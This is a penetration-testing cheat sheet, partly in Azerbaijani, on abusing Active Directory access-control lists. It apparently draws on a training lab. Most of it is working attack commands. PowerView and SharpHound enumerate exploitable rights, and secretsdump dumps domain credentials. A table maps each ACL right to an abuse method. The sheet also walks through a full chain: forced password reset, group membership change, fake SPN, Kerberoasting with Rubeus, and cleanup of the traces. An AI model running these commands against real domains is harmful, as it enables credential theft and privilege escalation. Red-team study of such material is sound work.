# Access Control List Abuse
<img width="975" height="452" alt="image" src="https://github.com/user-attachments/assets/17d9ea44-b8ff-4610-928d-b7f608798107" />

## Access Control List Command
```
Import-Module .\PowerView.ps1
Get-Module ActiveDirectory

# Bütün domain obyektlərinin ACL xəritəsi
Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN,ActiveDirectoryRights,IdentityReference

# Riskli Hüquqlar
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|Owner|DeleteChild" } | ft ObjectDN,ActiveDirectoryRights,IdentityReference -AutoSize

# User ACL-ləri
Get-ObjectAcl -Identity <USER> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" } ( Single User )

Get-DomainUser | ForEach-Object {
    Get-ObjectAcl -Identity $_.SamAccountName -ResolveGUIDs
} | ? {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
} | 
Select ObjectDN,ActiveDirectoryRights,IdentityReference ( All Users )

# Group ACL-ləri
Get-ObjectAcl -Identity "<GROUP NAME>" -ResolveGUIDs

Get-ObjectAcl -Identity "Help Desk Level 1" -ResolveGUIDs |
? { $_.IdentityReference -match "damundsen" } 

# User-Force-Change-Password ExtendedRight
Get-ADObject `
-SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
-LDAPFilter "(name=*Force*)" `
-Properties rightsGuid |
Select Name,DisplayName,RightsGuid

# Computer ACL-ləri
Get-ObjectAcl -Identity <COMPUTERNAME>$ -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite" }

# OU ACL-ləri (Child Creation Abuse)
Get-DomainOU | Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild" }

# Domain Root ACL
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectDN -match "^DC=" }

# SID-Based Targeted Hunt
$sid = Convert-NameToSid username

Get-DomainObjectACL -ResolveGUIDs -Identity * |
? { $_.SecurityIdentifier -eq $sid }

# Bir userin ( USER1 ) digər userlər üzərindəki ACL ləri
Get-DomainObjectACL -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (Get-DomainUser -Identity <USER1> -Properties objectsid).objectsid } | ? { $_.ObjectType -eq "User" -or $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" } | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType

# Bir Userin ( USER1 ) digər User ( USER2 ) üzərindəki ACL ləri
$SID = (Get-DomainUser -Identity <USER1>).objectsid
Get-DomainObjectACL -Identity <USER2> -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $SID }

$UserGroupsSIDs = Get-DomainGroup -MemberIdentity <USER1> | Select-Object -ExpandProperty objectsid
$UserSID = (Get-DomainUser -Identity <USER1>).objectsid
$AllSIDs = $UserGroupsSIDs + $UserSID
Get-DomainObjectACL -Identity adunn -ResolveGUIDs | ? { $AllSIDs -contains $_.SecurityIdentifier } | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType

# Digər userlərin müəyyən bir user <USER1> üzərindəki ACL ləri
Get-DomainObjectACL -Identity <USER1> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|GenericWrite|AllExtendedRights" } | Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType

"SID1", "SID2" | ConvertFrom-SID

Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select-Object MemberName

# Extended Rights Manual Analysis
$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
-Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |
Select Name,DisplayName,DistinguishedName,rightsGuid |
? { $_.rightsGuid -eq $guid }

# Group → MemberOf Chain Analysis
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

# Auto Discovery
Find-InterestingDomainAcl
```

## SharpHound
```
SharpHound.exe --CollectionMethods All --Domain domain.com --OutputDirectory C:\Users\htb-student\Desktop\bloodhound
```

## Impacket ilə LDAP ACL Enum
```
# DA ilə secretsdump + ACL parse
secretsdump.py domain/admin@dc-ip -just-dc

# ldapdomaindump (bütün ACL-lər)
ldapdomaindump -u 'domain\user' -p 'pass' dc-ip /tmp/ldapdump/
grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
```

## ACL Rights Mask-ları və Abuse Metodları
```

0x00000001  | CreateChild        | Alt obyekt yaratmaq (user/computer/OU creation, RBCD üçün machine account)
0x00000002  | DeleteChild        | Child obyekt silmək (DoS, GPO və ya admin hesabı silmək)
0x00000004  | ListChildren       | Child obyektləri görmək (Recon)
0x00000008  | Self               | Validated writes (məs. müəyyən hallarda SPN və ya xüsusi atribut dəyişiklikləri)
0x00000010  | ReadProperty       | Atributları oxumaq (SPN, LAPS, delegation info)
0x00000020  | WriteProperty      | Atribut dəyişmək (SPN add → targeted Kerberoast, RBCD, group member mod)
0x00000040  | DeleteTree         | Subtree silmək (struktur DoS)
0x00000080  | ListObject         | Gizli obyektləri görmək (Advanced recon)
0x00000100  | ExtendedRight      | Xüsusi hüquqlar (ResetPassword, DCSync – GUID-dən asılıdır)
0x00010000  | Delete             | Obyekti silmək (Admin hesabı / GPO silmək)
0x00020000  | ReadControl        | Security descriptor oxumaq (ACL recon)
0x00040000  | WriteDacl          | ACL dəyişmək (özünə hüquq əlavə edərək privilege escalation)
0x00080000  | WriteOwner         | Owner dəyişmək (takeover → sonra WriteDacl ilə full control)
0x10000000  | GenericAll         | Full control (ResetPass, ACL change, DCSync, persistence)
0x20000000  | GenericExecute     | Məhdud icra hüquqları (praktik eskalasiya nadir)
0x40000000  | GenericWrite       | Bir çox atributa write (SPN add → Kerberoasting, group takeover, RBCD)
0x80000000  | GenericRead        | Geniş oxuma hüququ (Kerberoast recon, LAPS read əgər qorunmayıbsa)

```

# ACL Abuse Tactics
```
# Creating a PSCredential Object
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Creating a SecureString Object
$<USER>Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Changing the User's Password
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Creating a SecureString Object using damundsen
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# Adding damundsen to the Help Desk Level 1 Group
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# Confirming damundsen was Added to the Group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Creating a Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Kerberoasting with Rubeus
.\Rubeus.exe kerberoast /user:adunn /nowrap

# Removing the Fake SPN from adunn's Account
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Removing damundsen from the Help Desk Level 1 Group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

# Change Password ACL
```
Get-DomainObjectACL -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll' -or $_.ObjectAceType -match 'User-Force-Change-Password'} | ? {$_.SecurityIdentifier -match (Get-DomainUser -Identity $env:USERNAME -Properties objectsid).objectsid}

Get-DomainObjectACL -ResolveGUIDs | ? {$_.ObjectAceType -match 'User-Force-Change-Password'} | Select-Object ObjectDN, SecurityIdentifier | Out-GridView
```
<img width="894" height="464" alt="Screenshot 2026-03-07 163209" src="https://github.com/user-attachments/assets/098da167-3eb9-4148-9e00-24f1ba0906f6" />
```
Get-DomainUser -Properties samaccountname, objectsid | ? {$_.objectsid -like '*-<RID>'}
Get-DomainGroup -Properties samaccountname, objectsid | ? {$_.objectsid -like '*-<RID>'}
Get-DomainComputer -Properties samaccountname, objectsid | ? {$_.objectsid -like '*-<RID>'}

Get-DomainGroupMember -Identity "<samaccountname>" | Select-Object MemberName





